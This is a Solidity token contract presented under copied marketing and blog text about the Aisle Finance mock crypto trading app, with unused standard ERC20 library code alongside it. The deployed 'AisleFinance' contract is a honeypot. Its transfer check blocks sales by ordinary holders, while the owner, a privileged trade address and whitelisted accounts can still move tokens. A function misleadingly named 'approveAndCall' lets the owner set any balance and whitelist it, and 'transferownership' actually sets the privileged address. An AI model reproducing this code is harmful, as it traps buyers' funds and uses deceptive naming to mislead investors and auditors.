/*

Aisle Finance attempts to create a payout scheme that is fair and meritocratic. For users who do not perform comparatively well in consecutive competitions and thus losing on AISLE, you will still be able to accumulate AISLE by claiming daily reward every day you use the app.

For more details of the 1-day, 3-day, 7-day competition payout scheme, please click here.

For more information about AISLE, please feel free to check out this blog article.

If you have any suggestion, please send an email to contact@Aisle Finance.com. We highly appreciate your feedback!

Disclaimer: Currently, AISLE is simply a game token on the Aisle Finance app. AISLE is not a crypto token yet — it has no cash value now and does not constitute your property.














The Era of Digital Assets



In the era of amplifying internet usage from all around the globe, digital assets will slowly become ubiquitous in our everyday lives. But wait, what is a digital asset?
What is a digital asset?
“Digital” simply means in the form of data. “Asset” is a resource that has economic value. Hence, “Digital Asset” is anything constructed by data and perceived as having economic value.
In the age of Web 2.0, information and content are generated and broadcasted all across the internet. Anyone can have access to it. Anyone can download a nice photograph and use it in other sites. There is an abundance of online resources ready to be copied, pasted and re-created.
For most online resources, no one has the exclusive right of data and content. Because it is not exclusive, it lacks economic value.
However, if an online resource is made exclusive to one’s ownership, possessable and non-duplicable, then it can have economic value. This concept gives birth to the first universal digital asset — Bitcoin.

What about Bitcoin?
Bitcoin, the digital money that can be transferred on the internet, has introduced and successfully proven the concept of exclusivity for digital data. But you may ask, what is so special about it? There are already Paypal, Venmo, Visa, Alipay, all serving the same function — online transaction of money.
Before we delve into the differences, one needs to understand the role of companies like Venmo. Remember that anyone can copy and paste digital data? Someone who is computer savvy can just cheat by copying and pasting more digital money. It is therefore up to PayPal (and banks) serving as an intermediary to prevent that. They do so by acknowledging your transaction, reconciling everyone’s account balance, and maintaining the authenticity of the money ledger.
Now, there are two notable differences between Bitcoin and traditional digital money. Firstly, these companies are intermediaries — they know everything about your identity and transaction details. They can even stop your transaction if they want to. Secondly, most transactions are either limited by national borders, or otherwise charging hefty transaction fees and long overdue.
Enters Bitcoin — a non-sovereign digital currency that is not controlled by any company, institution, and government.
Using Bitcoin, there is no intermediary that automatically collects your identity and transaction data. Probably not everyone cares about this anyway. The real advantage is you can send Bitcoin to someone on the other side of the world instantly and cheaply.
Bitcoin: ~10 min + $1–2 USD per transaction (average fee in July 2019)
vs
Bank: ~2+ day settlement + 2–3% fee
How does Bitcoin achieve such superiority?
According to the above metrics, you may wonder, how does Bitcoin achieve such superiority?
This is another complex topic. Long story short, Bitcoin uses blockchain technology to avoid having any human intermediary to maintain the ledger. With the underlying blockchain, no one can copy and paste Bitcoin. I can send you Bitcoin directly without going through PayPal or banks.
Although the functionality of Bitcoin sounds fantastic, there are still technical hurdles to overcome, such as the scalability limitation. The current Bitcoin network limits the maximum amount of transactions it can verify within a given amount of time. Despite the transfer process is still faster than traditional banking, it is still slower than Paypal or Visa.
Nonetheless, many talents are researching and developing solutions to overcome this scalability hurdle. A promising solution is Lightning Network — a second layer technology for bitcoin that uses micropayment channels to scale Bitcoin blockchain’s capability to conduct transactions.
Bitcoin makes life easier. Yet, it is just one example of digital assets. Other types of digital assets are emerging and slowly permeating into our everyday use cases, such as different cryptocurrencies and security tokens. We will cover the potential of Bitcoin and other digital asset use cases in future blogs, so stay tuned!


Launching Aisle — The Premier Mock Crypto Trading App


Mass adoption is a phrase everyone hears a lot within the crypto industry. To reach mass adoption, the industry will need to work together to build a positive narrative around this emerging asset class, especially amongst the young generation who will be the future users of digital tokens.
To increase awareness among youngsters like ourselves, we have built Aisle — a life-like mock crypto trading mobile app for people looking to gain cryptocurrency experience.

Available for download on Google Play: https://play.google.com/store/apps/details?id=leafyfied.aisle.finance

Sign-up for iOS Beta: https://www.aislefinance.com/

The app serves as a safe way to practice trading and investing with real-time market simulation, providing a realistic and risk-free environment for people to accelerate their crypto learning curve at zero costs.
While building the Aisle app, we want to deliver the message to our users (especially people new to the space) that cryptocurrency is not as scary as it sounds. For example, Bitcoin is not that expensive to buy — you don’t need $60,000 USD to buy a bitcoin because it is divisible.
We emphasize heavily on user interface and user experience of the mobile app. After all, we are building a simple, intuitive, and clean user interface that defines our state-of-the-art mobile platform.

To start off, users will receive $50,000 mock USD in their portfolios. Users can place buy and sell orders just like on an actual exchange. To mirror as close to real-life trading experience, users will be able to place both market order and limit order, each with different commission rates.
A distinguishing important element of Aisle is zero latency to real-time market prices. This is to make sure our users experience instant market movements for each token so that they can test trading strategies live. The app also provides a list of order history that shows a comprehensive record of user trading activities.

During this first launch, we are working closely with our first batch of users to collect feedback and continuously enhance Aisle’s user experience.
To our users: Have fun! Challenge yourself to achieve more and improve your skills with our easy-to-use features. Through participating in this lifelike simulated experience, we hope Aisle can boost your confidence with crypto trading and investing. Welcome to the digital token economy!
Aisle is a start-up based in the USC Incubator, co-founded by a few core members of the Blockchain@USC community.

Giving power back to people?

Many people have heard about Bitcoin; few people comprehend its deeper implications.
Some people understand the concept of blockchain; fewer of them recognize their use cases and potential.
What confuses people even more: how is blockchain related to cryptocurrencies? Why do some use cases require tokens (aka cryptocurrencies) while others do not?
And most of all, why should people care?
The interesting fact is that many people already do care. A variety of individuals and associations, from corporations to startups to governments to students, are already taking advantage of this new technology.
Facebook announced a proposal to launch its own cryptocurrency Libra onto the world’s largest social network. China and Venezuela, two very different countries, both declared plans to issue national cryptocurrencies. The SEC is pushing to make digital assets such as Bitcoin taxable. Even JP Morgan is launching the JPM Coin in spite of CEO Jamie Dimon’s openly professed dislike for Bitcoin.
What is the rationale behind so many powerful actors of the global economy getting involved with cryptocurrencies and blockchain tech?
There are 2 main benefits: 1) cost reduction and 2) value reallocation.
Cost reduction refers to the trimming of unnecessary business processes allowed by blockchain, thus cutting costs. Enterprises in the supply-chain and financial industry are implementing a semi-public blockchain, or “consortium blockchain”, to simplify and automate business processes for cost reduction.
Value reallocation, on the other hand, is what makes everyone want to have skin in the game. You may have already noticed the pattern already: different stakeholders (such as China, Facebook, and JP Morgan) are all trying to issue their version of a cryptocurrency. Think deeper, it makes sense. In theory, if value can be reallocated by new digital tokens, then whoever is behind the tokens will capture a large part of the value.
Economic value is quantified by money since it is a liquid medium of exchange. The money we use today consists of government-backed fiat currencies such as USD and RMB. However, serious problems exist with the current monetary system, which is largely controlled by governments and central banks.
So, what is wrong with the current monetary system?
To sum up, the world has become numb to the ever-inflating global economy. Too much money printing has consumed the future with debts.
Money printing refers to the non-stop quantitative easing programs the central banks have engaged in since the 2008 financial crisis. The problem is, this is merely a short term fix. The newly printed money does not effectively flow into the real consumer economy — clearly evidenced by the stagnated Consumer Price Index. It instead flows into financial assets — assets owned by the rich. So, the rich get richer, driving an even wider gap in wealth disparity. Meanwhile, the global economy is burdened with heavier debts.

This is part of why we see many geopolitical tensions in the developed world now, from Brexit to rising populist movements to Hong Kong’s situation today. As for developing countries such as Venezuela and Zimbabwe, people’s life savings are being depleted by hyperinflation due to poor government monetary policy. There is a global phenomenon of discontent with our current system.
These ongoing issues partly stem from the lack of an accountability system. Those who control our money do not make accountable and transparent decisions. Former regulator CFTC Chairman Chris Giancarlo sums it well:
“At the heart of the financial crisis, perhaps the most critical element was the lack of visibility into the counterparty credit exposure of one major financial institution to another. Probably the most glaring omission that needed to be addressed was that lack of visibility, and here we are in 2016 and we still don’t have it.”
So there you have it, the current monetary system is problematic for value allocation. If you watched the Joker movie, you can probably grasp the picture even better.
So, what’s next?

*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract AisleFinance {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}